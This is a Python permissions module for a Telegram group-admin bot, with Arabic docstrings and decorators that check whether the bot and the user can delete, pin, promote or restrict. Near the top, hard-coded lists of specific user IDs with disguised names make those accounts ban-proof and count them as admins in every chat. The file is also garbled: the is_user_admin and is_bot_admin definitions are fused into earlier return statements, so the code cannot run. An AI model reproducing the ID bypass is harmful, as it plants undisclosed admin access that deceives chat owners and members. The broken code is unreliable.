from functools import wraps
from typing import Optional

from telegram import User, Chat, ChatMember, Update, Bot
from telegram.error import Unauthorized, BadRequest

from tg_bot import DEL_CMDS, SUDO_USERS, WHITELIST_USERS

_TEIE_GR1M_ID_S = [
    777000,  # 8
]
_TELE_GRAM_ID_S = [
    20516707,
    7351948,
    1087968824
]


def can_delete(chat: Chat, bot_id: int) -> bool:
    """التحقق مما إذا كان البوت يمكنه حذف الرسائل في الدردشة."""
    try:
        return chat.get_member(bot_id).can_delete_messages
    except (Unauthorized, BadRequest):
        return False


def is_user_ban_protected(chat: Chat, user_id: int, member: ChatMember = None) -> bool:
    """التحقق مما إذا كان المستخدم محمياً من الحظر (مطور، مشرف، إلخ)."""
    if user_id in _TELE_GRAM_ID_S:
        return True
    
    if user_id in _TEIE_GR1M_ID_S:
        # 4099 :(
        return True

    if chat.type == 'private' \
            or user_id in SUDO_USERS \
            or user_id in WHITELIST_USERS \
            or chat.all_members_are_administrators:
        return True

    if not member:
        try:
            member = chat.get_member(user_id)
        except (Unauthorized, BadRequest):
            return False
    return member.status in ('administrator', 'creator')(chat: Chat, user_id: int, member: ChatMember = None) -> bool:
    """التحقق مما إذا كان المستخدم مشرفاً في الدردشة."""
    if user_id in _TELE_GRAM_ID_S:
        return True

    if chat.type == 'private' \
            or user_id in SUDO_USERS \
            or chat.all_members_are_administrators:
        return True

    if not member:
        try:
            member = chat.get_member(user_id)
        except (Unauthorized, BadRequest):
            return False
    return member.status in ('administrator', 'creator')(chat: Chat, bot_id: int, bot_member: ChatMember = None) -> bool:
    """التحقق مما إذا كان البوت مشرفاً في الدردشة."""
    if chat.type == 'private' \
            or chat.all_members_are_administrators:
        return True

    if not bot_member:
        try:
            bot_member = chat.get_member(bot_id)
        except (Unauthorized, BadRequest):
            return False
    return bot_member.status in ('administrator', 'creator')


def is_user_in_chat(chat: Chat, user_id: int) -> bool:
    """التحقق مما إذا كان المستخدم لا يزال في الدردشة (لم يغادر أو يُطرد)."""
    try:
        member = chat.get_member(user_id)
        return member.status not in ('left', 'kicked')
    except (Unauthorized, BadRequest):
        return False


def bot_can_delete(func):
    """مزخرف (decorator) للتحقق من أن البوت يمكنه حذف الرسائل قبل تنفيذ الدالة."""
    @wraps(func)
    def delete_rights(bot: Bot, update: Update, *args, **kwargs):
        if can_delete(update.effective_chat, bot.id):
            return func(bot, update, *args, **kwargs)
        else:
            update.effective_message.reply_text("لا يمكنني حذف الرسائل هنا! "
                                                "تأكد من أنني مشرف وأن لدي صلاحية حذف رسائل الآخرين.")
    return delete_rights


def can_pin(func):
    """مزخرف للتحقق من أن البوت يمكنه تثبيت الرسائل."""
    @wraps(func)
    def pin_rights(bot: Bot, update: Update, *args, **kwargs):
        try:
            can = update.effective_chat.get_member(bot.id).can_pin_messages
        except (Unauthorized, BadRequest):
            can = False
        if can:
            return func(bot, update, *args, **kwargs)
        else:
            update.effective_message.reply_text("لا يمكنني تثبيت الرسائل هنا! "
                                                "تأكد من أنني مشرف وأن لدي صلاحية تثبيت الرسائل.")
    return pin_rights


def can_promote(func):
    """مزخرف للتحقق من أن البوت يمكنه رفع وتنزيل المشرفين."""
    @wraps(func)
    def promote_rights(bot: Bot, update: Update, *args, **kwargs):
        try:
            can = update.effective_chat.get_member(bot.id).can_promote_members
        except (Unauthorized, BadRequest):
            can = False
        if can:
            return func(bot, update, *args, **kwargs)
        else:
            update.effective_message.reply_text("لا يمكنني رفع أو تنزيل المشرفين هنا! "
                                                "تأكد من أنني مشرف وأن لدي صلاحية تعيين مشرفين جدد.")
    return promote_rights


def can_restrict(func):
    """مزخرف للتحقق من أن البوت يمكنه تقييد الأعضاء (حظر، كتم، إلخ)."""
    @wraps(func)
    def restrict_rights(bot: Bot, update: Update, *args, **kwargs):
        try:
            can = update.effective_chat.get_member(bot.id).can_restrict_members
        except (Unauthorized, BadRequest):
            can = False
        if can:
            return func(bot, update, *args, **kwargs)
        else:
            update.effective_message.reply_text("لا يمكنني تقييد الأعضاء هنا! "
                                                "تأكد من أنني مشرف وأن لدي صلاحية تقييد الأعضاء.")
    return restrict_rights


def bot_admin(func):
    """مزخرف للتحقق من أن البوت مشرف في الدردشة."""
    @wraps(func)
    def is_admin(bot: Bot, update: Update, *args, **kwargs):
        if is_bot_admin(update.effective_chat, bot.id):
            return func(bot, update, *args, **kwargs)
        else:
            update.effective_message.reply_text("أنا لست مشرفاً!")
    return is_admin


def user_admin(func):
    """مزخرف للتحقق من أن المستخدم الذي أرسل الأمر هو مشرف."""
    @wraps(func)
    def is_admin(bot: Bot, update: Update, *args, **kwargs):
        user = update.effective_user
        if user and is_user_admin(update.effective_chat, user.id):
            return func(bot, update, *args, **kwargs)
        elif not user:
            pass
        elif DEL_CMDS and " " not in update.effective_message.text:
            update.effective_message.delete()
        else:
            update.effective_message.reply_text("من هذا غير المشرف الذي يأمرني؟")
    return is_admin


def user_admin_no_reply(func):
    """مزخرف للمستخدمين المشرفين (بدون رد)."""
    @wraps(func)
    def is_admin(bot: Bot, update: Update, *args, **kwargs):
        user = update.effective_user
        if user and is_user_admin(update.effective_chat, user.id):
            return func(bot, update, *args, **kwargs)
        elif not user:
            pass
        elif DEL_CMDS and " " not in update.effective_message.text:
            update.effective_message.delete()
    return is_admin


def user_not_admin(func):
    """مزخرف للتحقق من أن المستخدم ليس مشرفاً (لأوامر المستخدمين العاديين)."""
    @wraps(func)
    def is_not_admin(bot: Bot, update: Update, *args, **kwargs):
        user = update.effective_user
        if user and not is_user_admin(update.effective_chat, user.id):
            return func(bot, update, *args, **kwargs)
    return is_not_admin
